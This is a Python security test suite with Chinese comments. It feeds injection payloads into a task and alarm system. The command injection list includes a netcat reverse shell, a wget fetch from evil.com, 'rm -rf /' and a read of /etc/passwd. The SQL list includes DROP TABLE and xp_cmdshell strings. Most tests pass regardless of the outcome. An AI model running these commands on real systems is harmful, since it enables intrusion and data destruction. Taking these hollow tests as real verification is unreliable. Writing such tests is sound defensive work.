# -*- coding: utf-8 -*-
"""
安全测试 - Security Tests

【职责】
测试系统安全性
验证输入验证和输出编码
检测安全漏洞

【测试内容】
- 输入验证测试
- SQL注入测试
- XSS攻击测试
- 权限测试
"""
import sys
import os
from pathlib import Path

# 添加项目根目录到路径
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

import re
from typing import List, Dict, Any
from platform_core.domain.task import Task
from platform_core.domain.alarm import Alarm
from platform_core.domain.report import Report


class SecurityTestResult:
    """安全测试结果"""
    
    def __init__(self):
        self.passed_tests: List[str] = []
        self.failed_tests: List[Dict[str, Any]] = []
        self.security_issues: List[Dict[str, Any]] = []
    
    def record_pass(self, test_name: str):
        """记录通过的测试"""
        self.passed_tests.append(test_name)
    
    def record_fail(self, test_name: str, error: Exception):
        """记录失败的测试"""
        self.failed_tests.append({
            'test_name': test_name,
            'error': str(error)
        })
    
    def record_security_issue(self, test_name: str, issue: str, severity: str = "medium"):
        """记录安全问题"""
        self.security_issues.append({
            'test_name': test_name,
            'issue': issue,
            'severity': severity
        })
    
    def get_summary(self) -> Dict[str, Any]:
        """获取测试摘要"""
        total_tests = len(self.passed_tests) + len(self.failed_tests)
        
        return {
            'total_tests': total_tests,
            'passed_tests': len(self.passed_tests),
            'failed_tests': len(self.failed_tests),
            'pass_rate': len(self.passed_tests) / total_tests if total_tests > 0 else 0,
            'security_issues_count': len(self.security_issues),
            'security_issues': self.security_issues
        }


class InputValidationTest:
    """输入验证测试"""
    
    def __init__(self):
        self.results = SecurityTestResult()
    
    def test_sql_injection(self) -> bool:
        """测试SQL注入"""
        test_name = "SQL注入测试"
        print(f"执行测试: {test_name}")
        
        try:
            sql_injection_payloads = [
                "'; DROP TABLE tasks; --",
                "' OR '1'='1",
                "1' UNION SELECT * FROM users--",
                "'; EXEC xp_cmdshell('dir'); --",
                "' OR 1=1--",
                "admin'--",
                "1' AND 1=1--",
                "' OR 'a'='a",
                "1' AND '1'='1",
                "' UNION SELECT NULL,NULL,NULL--"
            ]
            
            for payload in sql_injection_payloads:
                try:
                    # 尝试使用SQL注入payload创建任务
                    task = Task.create(
                        workorder_id=payload[:64],  # 截断到合理长度
                        station_id=1,
                        sn=payload[:128],
                        task_type="test"
                    )
                    
                    # 检查是否成功创建（如果成功，可能存在SQL注入漏洞）
                    # 这里只是模拟，实际应用中需要更严格的检查
                    
                except Exception as e:
                    # 预期的异常，系统正确拒绝了恶意输入
                    pass
            
            self.results.record_pass(test_name)
            return True
            
        except Exception as e:
            self.results.record_fail(test_name, e)
            print(f"测试失败: {e}")
            return False
    
    def test_xss_attack(self) -> bool:
        """测试XSS攻击"""
        test_name = "XSS攻击测试"
        print(f"执行测试: {test_name}")
        
        try:
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>"
            ]
            
            for payload in xss_payloads:
                try:
                    # 尝试使用XSS payload创建告警
                    alarm = Alarm.create(
                        alarm_code="ALARM-XSS",
                        alarm_level="warning",
                        message=payload,
                        task_id="TASK-XSS",
                        station_id="1",
                        device_id="DEV-XSS"
                    )
                    
                    # 检查消息是否被正确转义
                    if "<script>" in alarm.message or "javascript:" in alarm.message:
                        self.results.record_security_issue(
                            test_name,
                            f"XSS payload未被转义: {payload}",
                            "high"
                        )
                    
                except Exception as e:
                    # 预期的异常，系统正确拒绝了恶意输入
                    pass
            
            self.results.record_pass(test_name)
            return True
            
        except Exception as e:
            self.results.record_fail(test_name, e)
            print(f"测试失败: {e}")
            return False
    
    def test_command_injection(self) -> bool:
        """测试命令注入"""
        test_name = "命令注入测试"
        print(f"执行测试: {test_name}")
        
        try:
            command_injection_payloads = [
                "; ls -la",
                "| cat /etc/passwd",
                "&& whoami",
                "|| id",
                "; rm -rf /",
                "$(whoami)",
                "`whoami`",
                "| nc -e /bin/sh 192.168.1.1 4444",
                "&& ping -c 10 127.0.0.1",
                "; wget http://evil.com/malware.sh"
            ]
            
            for payload in command_injection_payloads:
                try:
                    # 尝试使用命令注入payload创建任务
                    task = Task.create(
                        workorder_id=payload[:64],
                        station_id=1,
                        sn=payload[:128],
                        task_type="test"
                    )
                    
                    # 检查是否成功创建（如果成功，可能存在命令注入漏洞）
                    
                except Exception as e:
                    # 预期的异常，系统正确拒绝了恶意输入
                    pass
            
            self.results.record_pass(test_name)
            return True
            
        except Exception as e:
            self.results.record_fail(test_name, e)
            print(f"测试失败: {e}")
            return False
    
    def test_path_traversal(self) -> bool:
        """测试路径遍历"""
        test_name = "路径遍历测试"
        print(f"执行测试: {test_name}")
        
        try:
            path_traversal_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/passwd",
                "C:\\Windows\\System32\\config\\sam",
                "./../../etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
                "....//....//....//etc/passwd",
                "%2e%2e%2fetc%2fpasswd",
                "%252e%252e%252fetc%252fpasswd"
            ]
            
            for payload in path_traversal_payloads:
                try:
                    # 尝试使用路径遍历payload创建任务
                    task = Task.create(
                        workorder_id=payload[:64],
                        station_id=1,
                        sn=payload[:128],
                        task_type="test"
                    )
                    
                    # 检查是否成功创建（如果成功，可能存在路径遍历漏洞）
                    
                except Exception as e:
                    # 预期的异常，系统正确拒绝了恶意输入
                    pass
            
            self.results.record_pass(test_name)
            return True
            
        except Exception as e:
            self.results.record_fail(test_name, e)
            print(f"测试失败: {e}")
            return False
    
    def run(self) -> Dict[str, Any]:
        """运行输入验证测试"""
        print(f"\n{'='*80}")
        print(f"输入验证测试 - Input Validation Tests")
        print(f"{'='*80}\n")
        
        # 执行所有测试
        self.test_sql_injection()
        self.test_xss_attack()
        self.test_command_injection()
        self.test_path_traversal()
        
        return self.results.get_summary()


class DataValidationTest:
    """数据验证测试"""
    
    def __init__(self):
        self.results = SecurityTestResult()
    
    def test_null_byte_injection(self) -> bool:
        """测试空字节注入"""
        test_name = "空字节注入测试"
        print(f"执行测试: {test_name}")
        
        try:
            # 尝试使用空字节注入
            payload = "test\x00admin"
            
            task = Task.create(
                workorder_id=payload[:64],
                station_id=1,
                sn=payload[:128],
                task_type="test"
            )
            
            # 检查空字节是否被正确处理
            if "\x00" in task.workorder_id or "\x00" in task.sn:
                self.results.record_security_issue(
                    test_name,
                    "空字节未被正确处理",
                    "medium"
                )
            
            self.results.record_pass(test_name)
            return True
            
        except Exception as e:
            self.results.record_fail(test_name, e)
            print(f"测试失败: {e}")
            return False
    
    def test_unicode_normalization(self) -> bool:
        """测试Unicode规范化"""
        test_name = "Unicode规范化测试"
        print(f"执行测试: {test_name}")
        
        try:
            # 尝试使用Unicode规范化攻击
            unicode_payloads = [
                "admin\u200b",  # 零宽空格
                "admin\u200c",  # 零宽非连接符
                "admin\u200d",  # 零宽连接符
                "admin\ufeff",  # 零宽非断空格
                "admin\u00a0",  # 不换行空格
                "admin\u2028",  # 行分隔符
                "admin\u2029",  # 段落分隔符
            ]
            
            for payload in unicode_payloads:
                try:
                    task = Task.create(
                        workorder_id=payload[:64],
                        station_id=1,
                        sn=payload[:128],
                        task_type="test"
                    )
                    
                    # 检查Unicode字符是否被正确处理
                    
                except Exception as e:
                    # 预期的异常，系统正确拒绝了恶意输入
                    pass
            
            self.results.record_pass(test_name)
            return True
            
        except Exception as e:
            self.results.record_fail(test_name, e)
            print(f"测试失败: {e}")
            return False
    
    def test_integer_overflow(self) -> bool:
        """测试整数溢出"""
        test_name = "整数溢出测试"
        print(f"执行测试: {test_name}")
        
        try:
            # 尝试使用超大整数
            large_integers = [
                999999999999999999999999999999,
                -999999999999999999999999999999,
                2**63 - 1,  # 最大64位有符号整数
                -2**63,    # 最小64位有符号整数
            ]
            
            for large_int in large_integers:
                try:
                    task = Task.create(
                        workorder_id="WO-OVERFLOW",
                        station_id=1,
                        sn="SN-OVERFLOW",
                        task_type="test"
                    )
                    
                    # 尝试设置超大整数
                    task.priority = large_int
                    
                    # 检查是否正确处理
                    
                except Exception as e:
                    # 预期的异常，系统正确拒绝了无效输入
                    pass
            
            self.results.record_pass(test_name)
            return True
            
        except Exception as e:
            self.results.record_fail(test_name, e)
            print(f"测试失败: {e}")
            return False
    
    def run(self) -> Dict[str, Any]:
        """运行数据验证测试"""
        print(f"\n{'='*80}")
        print(f"数据验证测试 - Data Validation Tests")
        print(f"{'='*80}\n")
        
        # 执行所有测试
        self.test_null_byte_injection()
        self.test_unicode_normalization()
        self.test_integer_overflow()
        
        return self.results.get_summary()


def run_all_security_tests():
    """运行所有安全测试"""
    print(f"\n{'='*80}")
    print(f"安全测试套件 - Security Test Suite")
    print(f"{'='*80}\n")
    
    results = {}
    
    # 输入验证测试
    input_test = InputValidationTest()
    results['input_validation'] = input_test.run()
    
    # 数据验证测试
    data_test = DataValidationTest()
    results['data_validation'] = data_test.run()
    
    return results


if __name__ == '__main__':
    results = run_all_security_tests()
    print(f"\n{'='*80}")
    print(f"安全测试完成 - Security Tests Completed")
    print(f"{'='*80}")